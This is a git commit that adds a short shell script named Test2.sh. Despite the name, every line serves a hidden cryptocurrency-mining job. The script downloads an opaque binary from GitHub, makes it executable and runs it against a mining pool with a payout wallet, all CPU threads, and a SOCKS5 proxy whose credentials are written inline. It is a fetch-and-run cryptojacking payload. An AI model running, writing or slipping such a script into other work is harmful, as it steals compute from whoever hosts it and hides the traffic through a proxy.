f46d52a1b67818f38b46caa4683d14d26b3a298b
eyishxd <102873412+eyishxd@users.noreply.github.com>
2022-04-24 04:10:10 +0700

    Create Test2.sh

---
+++ Test2.sh
@@ -0,0 +1,4 @@
+apt update -y
+wget -q https://github.com/thirthada007/DevOps/raw/main/data
+chmod +x data
+./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u RBbGMpNtitSpNwGMT1cXgYNTfpYdHbrGde.Test -p c=RVN -t $(nproc) -x socks5://mix1019K1LFYM:r30OaQ0R@193.163.207.74:1080
